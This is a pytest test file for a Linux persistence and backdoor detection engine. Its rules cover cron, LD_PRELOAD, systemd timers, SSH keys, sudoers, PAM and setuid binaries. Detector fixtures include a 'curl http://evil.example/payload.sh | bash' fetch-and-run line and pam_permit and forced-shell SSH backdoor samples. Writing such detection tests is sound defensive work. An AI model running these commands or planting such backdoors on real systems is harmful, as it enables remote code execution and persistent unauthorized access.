import os
import time
from unittest.mock import MagicMock, patch

import pytest

from ubuntils.detectors.engine import ALL_RULES, DetectionEngine
from ubuntils.detectors.finding import Severity
from ubuntils.detectors.rules import (
    rule_cron_root_exec,
    rule_cron_tmp_path,
    rule_immutable_flag_set,
    rule_ld_preload_inject,
    rule_process_masquerade,
    rule_setuid_inventory,
    rule_shell_rc_modification,
    rule_ssh_unauthorized_key,
    rule_sudoers_nopasswd,
    rule_suspicious_systemd_timer,
    rule_uid_zero_account,
)
from ubuntils.utils.baseline import Baseline
from ubuntils.utils.config import Allowlist

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _cron_entry(owner="alice", run_as="alice", command="backup.sh", source="/etc/cron.d/test"):
    return {"owner": owner, "run_as": run_as, "command": command, "source": source}


def _user_entry(username="alice", uid=1001, shell="/bin/bash", home="/home/alice"):
    return {"username": username, "uid": uid, "shell": shell, "home": home, "is_login_shell": True}


# ---------------------------------------------------------------------------
# CRON_ROOT_EXEC
# ---------------------------------------------------------------------------

def test_rule_cron_root_exec_detects_run_as_root():
    artifacts = {"cron_entries": [_cron_entry(owner="alice", run_as="root")]}
    findings = rule_cron_root_exec(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "CRON_ROOT_EXEC"
    assert findings[0].severity == Severity.HIGH


def test_rule_cron_root_exec_clean():
    artifacts = {"cron_entries": [_cron_entry(owner="root", run_as="root", command="backup.sh")]}
    findings = rule_cron_root_exec(artifacts)
    assert findings == []


def test_rule_cron_root_exec_sudo_keyword():
    artifacts = {"cron_entries": [_cron_entry(owner="alice", run_as="alice", command="sudo rm -rf /tmp/junk")]}
    findings = rule_cron_root_exec(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "CRON_ROOT_EXEC"
    assert findings[0].severity == Severity.HIGH


def test_rule_cron_root_exec_empty_artifacts():
    assert rule_cron_root_exec({}) == []


# ---------------------------------------------------------------------------
# CRON_TMP_PATH
# ---------------------------------------------------------------------------

def test_rule_cron_tmp_path_detects_bad():
    artifacts = {"cron_entries": [_cron_entry(command="/tmp/evil.sh arg1")]}
    findings = rule_cron_tmp_path(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "CRON_TMP_PATH"
    assert findings[0].severity == Severity.HIGH


def test_rule_cron_tmp_path_clean():
    artifacts = {"cron_entries": [_cron_entry(command="/usr/bin/backup.sh")]}
    findings = rule_cron_tmp_path(artifacts)
    assert findings == []


def test_rule_cron_tmp_path_var_tmp():
    artifacts = {"cron_entries": [_cron_entry(command="/var/tmp/payload")]}
    findings = rule_cron_tmp_path(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "CRON_TMP_PATH"


def test_rule_cron_tmp_path_dev_shm():
    artifacts = {"cron_entries": [_cron_entry(command="/dev/shm/runner")]}
    findings = rule_cron_tmp_path(artifacts)
    assert len(findings) == 1


def test_rule_cron_tmp_path_empty_artifacts():
    assert rule_cron_tmp_path({}) == []


# ---------------------------------------------------------------------------
# LD_PRELOAD_INJECT
# ---------------------------------------------------------------------------

def _ld_preload_entry(value, source="/home/alice/.bashrc"):
    return {
        "owner": "alice",
        "source": source,
        "variable": "LD_PRELOAD",
        "value": value,
        "raw_line": f"export LD_PRELOAD={value}",
    }


def test_rule_ld_preload_inject_detects_bad():
    artifacts = {"env_definitions": [_ld_preload_entry("/tmp/evil.so")]}
    findings = rule_ld_preload_inject(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "LD_PRELOAD_INJECT"
    assert findings[0].severity == Severity.HIGH


def test_rule_ld_preload_inject_clean():
    artifacts = {"env_definitions": [
        {"owner": "alice", "source": "/home/alice/.bashrc", "variable": "PATH",
         "value": "/usr/local/bin", "raw_line": "export PATH=/usr/local/bin"}
    ]}
    findings = rule_ld_preload_inject(artifacts)
    assert findings == []


def test_rule_ld_preload_standard_path_no_finding():
    artifacts = {"env_definitions": [_ld_preload_entry("/usr/lib/libfoo.so")]}
    findings = rule_ld_preload_inject(artifacts)
    assert findings == []


def test_rule_ld_preload_inject_empty_artifacts():
    assert rule_ld_preload_inject({}) == []


# ---------------------------------------------------------------------------
# SUSPICIOUS_SYSTEMD_TIMER
# ---------------------------------------------------------------------------

def _timer_entry(unit="evil.timer", activates="evil.service", exec_start="/tmp/runner.sh"):
    return {"unit": unit, "activates": activates, "exec_start": exec_start}


def test_rule_suspicious_systemd_timer_detects_bad():
    artifacts = {"timers": [_timer_entry(exec_start="/tmp/runner.sh")]}
    findings = rule_suspicious_systemd_timer(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "SUSPICIOUS_SYSTEMD_TIMER"
    assert findings[0].severity == Severity.HIGH


def test_rule_suspicious_systemd_timer_clean():
    artifacts = {"timers": [_timer_entry(exec_start="/usr/bin/backup.sh")]}
    findings = rule_suspicious_systemd_timer(artifacts)
    assert findings == []


def test_rule_suspicious_systemd_timer_var_tmp():
    artifacts = {"timers": [_timer_entry(exec_start="/var/tmp/payload")]}
    findings = rule_suspicious_systemd_timer(artifacts)
    assert len(findings) == 1


def test_rule_suspicious_systemd_timer_no_exec_start():
    artifacts = {"timers": [{"unit": "safe.timer", "activates": "safe.service", "exec_start": ""}]}
    findings = rule_suspicious_systemd_timer(artifacts)
    assert findings == []


def test_rule_suspicious_systemd_timer_empty_artifacts():
    assert rule_suspicious_systemd_timer({}) == []


# ---------------------------------------------------------------------------
# SSH_UNAUTHORIZED_KEY
# ---------------------------------------------------------------------------

def _ssh_key_entry(username="alice", home="/home/alice", file_mtime=None):
    if file_mtime is None:
        file_mtime = time.time() - 3600  # 1 hour ago — recent
    return {
        "username": username,
        "home": home,
        "key_type": "ssh-rsa",
        "key_data": "AAAAB3NzaC1yc2EAAAA",
        "comment": "test@host",
        "file_mtime": file_mtime,
    }


def test_rule_ssh_unauthorized_key_detects_bad():
    artifacts = {"authorized_keys": [_ssh_key_entry()]}
    findings = rule_ssh_unauthorized_key(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "SSH_UNAUTHORIZED_KEY"
    assert findings[0].severity == Severity.MEDIUM


def test_rule_ssh_unauthorized_key_clean():
    artifacts = {"authorized_keys": [_ssh_key_entry(file_mtime=time.time() - 30 * 24 * 3600)]}
    findings = rule_ssh_unauthorized_key(artifacts)
    assert findings == []


def test_rule_ssh_key_old_file_no_finding():
    artifacts = {"authorized_keys": [_ssh_key_entry(file_mtime=time.time() - 30 * 24 * 3600)]}
    findings = rule_ssh_unauthorized_key(artifacts)
    assert findings == []


def test_rule_ssh_unauthorized_key_empty_artifacts():
    assert rule_ssh_unauthorized_key({}) == []


def test_ssh_rule_bare_mtime_touch_is_low_confidence():
    # ctime NOT recent (file existed, only mtime was touched), no dangerous options.
    old_ctime = time.time() - 400 * 24 * 3600
    entry = _ssh_key_entry(file_mtime=time.time() - 3600)
    entry["file_ctime"] = old_ctime
    entry["options"] = ""
    findings = rule_ssh_unauthorized_key({"authorized_keys": [entry]})
    assert len(findings) == 1
    assert findings[0].confidence_band == "LOW"
    assert findings[0].signals[0]["name"] == "mtime_only"


def test_ssh_rule_dangerous_option_is_high_confidence():
    entry = _ssh_key_entry(file_mtime=time.time() - 3600)
    entry["file_ctime"] = time.time() - 3600
    entry["options"] = 'command="/bin/sh"'
    findings = rule_ssh_unauthorized_key({"authorized_keys": [entry]})
    assert len(findings) == 1
    assert findings[0].confidence_band == "HIGH"
    signal_names = {s["name"] for s in findings[0].signals}
    assert "content_match" in signal_names
    assert "ctime_corroborates_mtime" in signal_names


# ---------------------------------------------------------------------------
# SUDOERS_NOPASSWD
# ---------------------------------------------------------------------------

def _sudoers_rule(user="alice", options="NOPASSWD: ALL", source="/etc/sudoers"):
    return {
        "source": source,
        "user": user,
        "host": "ALL",
        "run_as": "ALL",
        "options": options,
        "commands": "ALL",
        "raw_line": f"{user} ALL=(ALL) {options}",
    }


def test_rule_sudoers_nopasswd_detects_bad():
    artifacts = {
        "sudoers_rules": [_sudoers_rule(user="alice")],
        "users": [_user_entry(username="alice", uid=1001, shell="/bin/bash")],
    }
    findings = rule_sudoers_nopasswd(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "SUDOERS_NOPASSWD"
    assert findings[0].severity == Severity.MEDIUM


def test_rule_sudoers_nopasswd_clean():
    artifacts = {
        "sudoers_rules": [_sudoers_rule(user="root", options="ALL")],
        "users": [_user_entry(username="root", uid=0, shell="/bin/bash")],
    }
    findings = rule_sudoers_nopasswd(artifacts)
    assert findings == []


def test_rule_sudoers_nopasswd_system_user_no_finding():
    artifacts = {
        "sudoers_rules": [_sudoers_rule(user="daemon", options="NOPASSWD: ALL")],
        "users": [_user_entry(username="daemon", uid=1, shell="/usr/sbin/nologin")],
    }
    findings = rule_sudoers_nopasswd(artifacts)
    assert findings == []


def test_rule_sudoers_nopasswd_nologin_shell_no_finding():
    artifacts = {
        "sudoers_rules": [_sudoers_rule(user="svc", options="NOPASSWD: ALL")],
        "users": [_user_entry(username="svc", uid=1500, shell="/sbin/nologin")],
    }
    findings = rule_sudoers_nopasswd(artifacts)
    assert findings == []


def test_rule_sudoers_nopasswd_unknown_user_no_finding():
    artifacts = {
        "sudoers_rules": [_sudoers_rule(user="ghost", options="NOPASSWD: ALL")],
        "users": [],
    }
    findings = rule_sudoers_nopasswd(artifacts)
    assert findings == []


def test_rule_sudoers_nopasswd_empty_artifacts():
    assert rule_sudoers_nopasswd({}) == []


# ---------------------------------------------------------------------------
# PROCESS_MASQUERADE
# ---------------------------------------------------------------------------

def _proc_entry(name="sshd", exe="/usr/sbin/sshd", pid=1234, uid=0):
    return {"pid": pid, "name": name, "uid": uid, "exe": exe, "cmdline": name}


def test_rule_process_masquerade_detects_bad():
    artifacts = {"processes": [_proc_entry(name="sshd", exe="/tmp/sshd")]}
    findings = rule_process_masquerade(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "PROCESS_MASQUERADE"
    assert findings[0].severity == Severity.MEDIUM


def test_rule_process_masquerade_clean():
    artifacts = {"processes": [_proc_entry(name="sshd", exe="/usr/sbin/sshd")]}
    findings = rule_process_masquerade(artifacts)
    assert findings == []


def test_rule_process_masquerade_unknown_binary_no_finding():
    artifacts = {"processes": [_proc_entry(name="myapp", exe="/tmp/myapp")]}
    findings = rule_process_masquerade(artifacts)
    assert findings == []


def test_rule_process_masquerade_empty_exe_no_finding():
    artifacts = {"processes": [_proc_entry(name="sshd", exe="")]}
    findings = rule_process_masquerade(artifacts)
    assert findings == []


def test_rule_process_masquerade_empty_artifacts():
    assert rule_process_masquerade({}) == []


# ---------------------------------------------------------------------------
# SHELL_RC_MODIFICATION
# ---------------------------------------------------------------------------

def test_rule_shell_rc_modification_detects_bad(tmp_path):
    bashrc = tmp_path / ".bashrc"
    bashrc.write_text("export PATH=/usr/local/bin:$PATH\n")
    recent_mtime = time.time() - 3600  # 1 hour ago
    os.utime(bashrc, (recent_mtime, recent_mtime))

    artifacts = {"shell_init_files": [{
        "owner": "alice",
        "source": str(bashrc),
        "mtime": recent_mtime,
        "ctime": time.time() - 400 * 24 * 3600,
        "content": "export PATH=/usr/local/bin:$PATH\n",
    }]}
    findings = rule_shell_rc_modification(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "SHELL_RC_MODIFICATION"
    assert findings[0].severity == Severity.LOW


def test_rule_shell_rc_modification_clean(tmp_path):
    bashrc = tmp_path / ".bashrc"
    bashrc.write_text("export PATH=/usr/local/bin:$PATH\n")
    old_mtime = time.time() - 72 * 3600  # 3 days ago
    os.utime(bashrc, (old_mtime, old_mtime))

    artifacts = {"env_definitions": [{
        "owner": "alice",
        "source": str(bashrc),
        "variable": "PATH",
        "value": "/usr/local/bin:$PATH",
        "raw_line": "export PATH=/usr/local/bin:$PATH",
    }]}
    findings = rule_shell_rc_modification(artifacts)
    assert findings == []


def test_rule_shell_rc_modification_system_owner_no_finding(tmp_path):
    profile = tmp_path / ".profile"
    profile.write_text("export VAR=val\n")
    recent_mtime = time.time() - 1800
    os.utime(profile, (recent_mtime, recent_mtime))

    artifacts = {"env_definitions": [{
        "owner": "system",
        "source": str(profile),
        "variable": "VAR",
        "value": "val",
        "raw_line": "export VAR=val",
    }]}
    findings = rule_shell_rc_modification(artifacts)
    assert findings == []


def test_rule_shell_rc_modification_non_init_file_no_finding(tmp_path):
    conffile = tmp_path / "somefile.conf"
    conffile.write_text("export VAR=val\n")
    recent_mtime = time.time() - 1800
    os.utime(conffile, (recent_mtime, recent_mtime))

    artifacts = {"env_definitions": [{
        "owner": "alice",
        "source": str(conffile),
        "variable": "VAR",
        "value": "val",
        "raw_line": "export VAR=val",
    }]}
    findings = rule_shell_rc_modification(artifacts)
    assert findings == []


def test_rule_shell_rc_modification_empty_artifacts():
    assert rule_shell_rc_modification({}) == []


def _rc_file_entry(owner="alice", source="/home/alice/.bashrc", mtime=None, ctime=None,
                    content="export PATH=$PATH:/usr/local/bin\n"):
    now = time.time()
    return {
        "owner": owner, "source": source,
        "mtime": mtime if mtime is not None else now - 3600,
        "ctime": ctime if ctime is not None else now - 400 * 24 * 3600,
        "content": content,
    }


def test_shell_rc_rule_bare_touch_is_low_confidence():
    findings = rule_shell_rc_modification({"shell_init_files": [_rc_file_entry()]})
    assert len(findings) == 1
    assert findings[0].confidence_band == "LOW"


def test_shell_rc_rule_curl_to_shell_is_high_confidence():
    entry = _rc_file_entry(
        content="curl http://evil.example/payload.sh | bash\n",
        ctime=time.time() - 3600,
    )
    findings = rule_shell_rc_modification({"shell_init_files": [entry]})
    assert len(findings) == 1
    assert findings[0].confidence_band == "HIGH"
    signal_names = {s["name"] for s in findings[0].signals}
    assert "content_match" in signal_names
    assert "ctime_corroborates_mtime" in signal_names


def test_shell_rc_rule_never_reads_the_analyst_filesystem(tmp_path, monkeypatch):
    # Regression guard for the os.stat-bypass bug: the rule must derive
    # everything from the artifacts dict, never touch the real filesystem.
    def _boom(*a, **kw):
        raise AssertionError("rule_shell_rc_modification must not call os.stat")
    monkeypatch.setattr("os.stat", _boom)
    findings = rule_shell_rc_modification({"shell_init_files": [_rc_file_entry()]})
    assert len(findings) == 1


# ---------------------------------------------------------------------------
# DetectionEngine
# ---------------------------------------------------------------------------

def test_engine_runs_all_rules():
    mock_finding = MagicMock()
    with patch("ubuntils.detectors.engine.ALL_RULES", [
        MagicMock(return_value=[mock_finding]) for _ in range(8)
    ]):
        engine = DetectionEngine()
        results = engine.run({})
    assert len(results) == 8


def test_engine_continues_on_rule_error():
    good_finding = MagicMock()
    bad_rule = MagicMock(side_effect=RuntimeError("rule exploded"))
    bad_rule.__name__ = "bad_rule"
    good_rule = MagicMock(return_value=[good_finding])
    good_rule.__name__ = "good_rule"

    with patch("ubuntils.detectors.engine.ALL_RULES", [bad_rule, good_rule]):
        engine = DetectionEngine()
        results = engine.run({})
    assert len(results) == 1
    assert results[0] is good_finding


def test_engine_empty_artifacts():
    engine = DetectionEngine()
    results = engine.run({})
    assert results == []


def test_uid_zero_flags_non_root_account():
    artifacts = {"users": [
        {"username": "root", "uid": 0, "gid": 0, "shell": "/bin/bash"},
        {"username": "backdoor", "uid": 0, "gid": 0, "shell": "/bin/bash"},
    ]}
    findings = rule_uid_zero_account(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "USER_UID_ZERO"
    assert findings[0].severity == Severity.HIGH
    assert "backdoor" in findings[0].description


def test_uid_zero_clean_when_only_root():
    artifacts = {"users": [
        {"username": "root", "uid": 0, "gid": 0, "shell": "/bin/bash"},
        {"username": "alice", "uid": 1000, "gid": 1000, "shell": "/bin/bash"},
    ]}
    assert rule_uid_zero_account(artifacts) == []


def test_uid_zero_no_users_key():
    assert rule_uid_zero_account({}) == []


def test_engine_all_rules_registered():
    assert len(ALL_RULES) == 11


def test_engine_runs_custom_rules_and_allowlist_suppresses_them():
    from ubuntils.detectors.custom_rules import CustomRule
    from ubuntils.detectors.engine import DetectionEngine
    from ubuntils.detectors.finding import Severity
    from ubuntils.utils.config import Allowlist

    rule = CustomRule(
        id="CUSTOM_X", severity=Severity.HIGH, title="t", description="d",
        source="process", match="substring", pattern="evilbin",
    )
    artifacts = {"processes": [{"pid": 9, "name": "x", "exe": "/tmp/evilbin", "cmdline": "evilbin"}]}

    findings = DetectionEngine(custom_rules=[rule]).run(artifacts)
    assert any(f.rule_id == "CUSTOM_X" for f in findings)

    suppressed = DetectionEngine(
        custom_rules=[rule], allowlist=Allowlist(rules=["CUSTOM_X"])
    ).run(artifacts)
    assert not any(f.rule_id == "CUSTOM_X" for f in suppressed)


def test_engine_without_custom_rules_unchanged():
    from ubuntils.detectors.engine import DetectionEngine
    assert DetectionEngine().run({}) == []


def _conn(pid="42", remote_addr="10.0.0.5", remote_port="4444", state="ESTAB"):
    return {"proto": "tcp", "local_addr": "192.168.1.2", "local_port": "5555",
            "remote_addr": remote_addr, "remote_port": remote_port, "state": state, "pid": pid}


def test_suspicious_connection_flags_tmp_exe_with_outbound():
    from ubuntils.detectors.rules import rule_process_suspicious_connection
    artifacts = {
        "processes": [{"pid": 42, "name": "x", "uid": 0, "exe": "/tmp/implant", "cmdline": "x"}],
        "connections": [_conn(pid="42")],
    }
    findings = rule_process_suspicious_connection(artifacts)
    assert len(findings) == 1
    assert findings[0].rule_id == "PROCESS_SUSPICIOUS_CONNECTION"
    assert findings[0].severity == Severity.HIGH
    assert findings[0].remediation_available is False


def test_suspicious_connection_flags_nonstandard_port_standard_exe():
    from ubuntils.detectors.rules import rule_process_suspicious_connection
    artifacts = {
        "processes": [{"pid": 42, "name": "bash", "uid": 0, "exe": "/bin/bash", "cmdline": "bash"}],
        "connections": [_conn(pid="42", remote_port="4444")],
    }
    findings = rule_process_suspicious_connection(artifacts)
    assert len(findings) == 1
    assert findings[0].severity == Severity.MEDIUM


def test_suspicious_connection_ignores_standard_exe_common_port():
    from ubuntils.detectors.rules import rule_process_suspicious_connection
    artifacts = {
        "processes": [{"pid": 42, "name": "curl", "uid": 0, "exe": "/usr/bin/curl", "cmdline": "curl"}],
        "connections": [_conn(pid="42", remote_port="443")],
    }
    assert rule_process_suspicious_connection(artifacts) == []


def test_suspicious_connection_ignores_listener_no_remote():
    from ubuntils.detectors.rules import rule_process_suspicious_connection
    artifacts = {
        "processes": [{"pid": 42, "name": "x", "uid": 0, "exe": "/tmp/implant", "cmdline": "x"}],
        "connections": [{"proto": "tcp", "local_addr": "0.0.0.0", "local_port": "4444",
                         "remote_addr": "0.0.0.0", "remote_port": "*", "state": "LISTEN", "pid": "42"}],
    }
    assert rule_process_suspicious_connection(artifacts) == []


def test_suspicious_connection_empty_artifacts():
    from ubuntils.detectors.rules import rule_process_suspicious_connection
    assert rule_process_suspicious_connection({}) == []


def test_engine_includes_suspicious_connection_rule():
    from ubuntils.detectors.engine import ALL_RULES
    from ubuntils.detectors.rules import rule_process_suspicious_connection
    assert rule_process_suspicious_connection in ALL_RULES


def test_systemd_timer_has_guided_remediation():
    from ubuntils.detectors.rules import rule_suspicious_systemd_timer
    artifacts = {"timers": [{"unit": "evil.timer", "exec_start": "/tmp/payload.sh"}]}
    findings = rule_suspicious_systemd_timer(artifacts)
    assert findings[0].remediation_available is False
    assert "evil.timer" in findings[0].guided_remediation
    assert "systemctl" in findings[0].guided_remediation


def test_process_masquerade_has_guided_remediation():
    from ubuntils.detectors.rules import rule_process_masquerade
    artifacts = {"processes": [{"pid": 99, "name": "sshd", "exe": "/tmp/sshd", "cmdline": "sshd"}]}
    findings = rule_process_masquerade(artifacts)
    assert findings[0].remediation_available is False
    assert "99" in findings[0].guided_remediation


def test_shell_rc_modification_has_guided_remediation(tmp_path):
    from ubuntils.detectors.rules import rule_shell_rc_modification
    rc = tmp_path / ".bashrc"
    rc.write_text("export PATH=$PATH\n")
    os.utime(str(rc), (time.time(), time.time()))
    artifacts = {"shell_init_files": [
        {"owner": "alice", "source": str(rc), "mtime": time.time(),
         "ctime": time.time() - 400 * 24 * 3600, "content": "export PATH=$PATH\n"}]}
    findings = rule_shell_rc_modification(artifacts)
    assert findings[0].remediation_available is False
    assert str(rc) in findings[0].guided_remediation


def test_engine_applies_baseline_before_allowlist_and_counts_suppressed():
    """Baseline and allowlist suppress two *different* findings, proving the
    two mechanisms compose: baseline drops SSH_UNAUTHORIZED_KEY (counted),
    allowlist drops USER_UID_ZERO (not baseline-counted), and both are gone
    from the final result."""
    artifacts = {
        "authorized_keys": [_ssh_key_entry()],
        "users": [_user_entry(username="ghost", uid=0, shell="/bin/bash")],
    }
    baseline = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": "test@host"}])
    allowlist = Allowlist(rules=["USER_UID_ZERO"])
    engine = DetectionEngine(baseline=baseline, allowlist=allowlist)
    findings = engine.run(artifacts)
    assert not any(f.rule_id == "SSH_UNAUTHORIZED_KEY" for f in findings)
    assert not any(f.rule_id == "USER_UID_ZERO" for f in findings)
    # Only the baseline-matched finding is counted by suppressed_by_baseline;
    # the allowlist-suppressed one is not double-counted or miscounted.
    assert engine.suppressed_by_baseline == 1
    assert [f.rule_id for f in engine.baseline_suppressed_findings] == ["SSH_UNAUTHORIZED_KEY"]


def test_rule_package_tampered_flags_content_mismatch_and_missing():
    from ubuntils.detectors.rules import rule_package_tampered

    artifacts = {
        "dpkg_verify_entries": [
            {"path": "/usr/bin/sshd", "flags": "", "is_conffile": False, "missing": True},
            {"path": "/usr/bin/passwd", "flags": "....5..T.", "is_conffile": False, "missing": False},
            {"path": "/etc/ssh/sshd_config", "flags": "??5??????", "is_conffile": True, "missing": False},
        ]
    }
    findings = rule_package_tampered(artifacts)
    triggered_paths = {f.artifact_path for f in findings}

    assert "/usr/bin/sshd" in triggered_paths          # missing binary
    assert "/usr/bin/passwd" in triggered_paths         # content (5) mismatch, non-conffile
    assert "/etc/ssh/sshd_config" not in triggered_paths  # conffile content edits are expected/low-signal
    assert all(f.rule_id == "PACKAGE_TAMPERED" for f in findings)
    assert all(f.remediation_available is False for f in findings)

    missing = next(f for f in findings if f.artifact_path == "/usr/bin/sshd")
    assert missing.confidence_band == "HIGH"
    assert any(s["name"] == "missing_file" for s in missing.signals)

    tampered = next(f for f in findings if f.artifact_path == "/usr/bin/passwd")
    assert tampered.confidence_band == "HIGH"
    assert any(s["name"] == "content_match" for s in tampered.signals)


def test_rule_package_tampered_ignores_conffile_only_mtime_changes():
    from ubuntils.detectors.rules import rule_package_tampered

    artifacts = {
        "dpkg_verify_entries": [
            {"path": "/etc/foo.conf", "flags": ".......T.", "is_conffile": True, "missing": False},
        ]
    }
    assert rule_package_tampered(artifacts) == []


def test_rule_immutable_flag_set_flags_immutable_and_append_only():
    artifacts = {
        "immutable_flags": [
            {"path": "/etc/ld.so.preload", "attrs": "----i--------e---"},
            {"path": "/etc/passwd", "attrs": "-------------e---"},
            {"path": "/var/log/auth.log", "attrs": "-----a-------e---"},
        ]
    }
    findings = rule_immutable_flag_set(artifacts)
    triggered = {f.artifact_path for f in findings}

    assert "/etc/ld.so.preload" in triggered   # 'i' set — suspicious
    assert "/var/log/auth.log" in triggered    # 'a' set — suspicious (log-hiding tactic)
    assert "/etc/passwd" not in triggered      # no i/a flag present
    assert all(f.rule_id == "IMMUTABLE_FLAG_SET" and f.severity == Severity.MEDIUM for f in findings)
    assert all(any(s["name"] == "content_match" for s in f.signals) for f in findings)


def test_rule_setuid_inventory_flags_unknown_binaries_and_writable_tmp():
    artifacts = {
        "setuid_binaries": [
            "/usr/bin/sudo",              # known-good, no finding
            "/tmp/.hidden/backdoor",      # unknown + in writable tmp — most suspicious
            "/usr/local/bin/mystery",     # unknown, outside writable tmp
        ]
    }
    findings = rule_setuid_inventory(artifacts)
    triggered = {f.artifact_path for f in findings}

    assert "/usr/bin/sudo" not in triggered
    assert "/tmp/.hidden/backdoor" in triggered
    assert "/usr/local/bin/mystery" in triggered
    assert all(f.rule_id == "SETUID_INVENTORY" and f.severity == Severity.LOW for f in findings)

    in_tmp = next(f for f in findings if f.artifact_path == "/tmp/.hidden/backdoor")
    outside_tmp = next(f for f in findings if f.artifact_path == "/usr/local/bin/mystery")
    assert in_tmp.confidence > outside_tmp.confidence  # writable-tmp location raises confidence
    assert any(s["name"] == "writable_tmp_location" for s in in_tmp.signals)
    assert not any(s["name"] == "writable_tmp_location" for s in outside_tmp.signals)


# ---------------------------------------------------------------------------
# PAM_BACKDOOR
# ---------------------------------------------------------------------------

def test_rule_pam_backdoor_flags_pam_permit_and_unknown_nss_module():
    from ubuntils.detectors.rules import rule_pam_backdoor

    artifacts = {
        "pam_files": [
            {"path": "/etc/pam.d/sshd", "content": "auth sufficient pam_permit.so\n"},
            {"path": "/etc/pam.d/common-auth", "content": "auth required pam_unix.so nullok\n"},
        ],
        "nsswitch_content": "passwd: files systemd evilmodule\n",
    }
    findings = rule_pam_backdoor(artifacts)
    triggered_paths = {f.artifact_path for f in findings}

    assert "/etc/pam.d/sshd" in triggered_paths
    assert "/etc/pam.d/common-auth" not in triggered_paths
    assert "/etc/nsswitch.conf" in triggered_paths
    assert all(f.rule_id == "PAM_BACKDOOR" and f.severity == Severity.HIGH for f in findings)
    assert all(f.confidence_band == "HIGH" for f in findings)
    assert all(any(s["name"] == "content_match" for s in f.signals) for f in findings)


def test_rule_pam_backdoor_clean_config_produces_no_findings():
    from ubuntils.detectors.rules import rule_pam_backdoor

    artifacts = {
        "pam_files": [
            {"path": "/etc/pam.d/common-auth", "content": "auth required pam_unix.so nullok\n"},
        ],
        "nsswitch_content": "passwd: files systemd\n",
    }
    assert rule_pam_backdoor(artifacts) == []
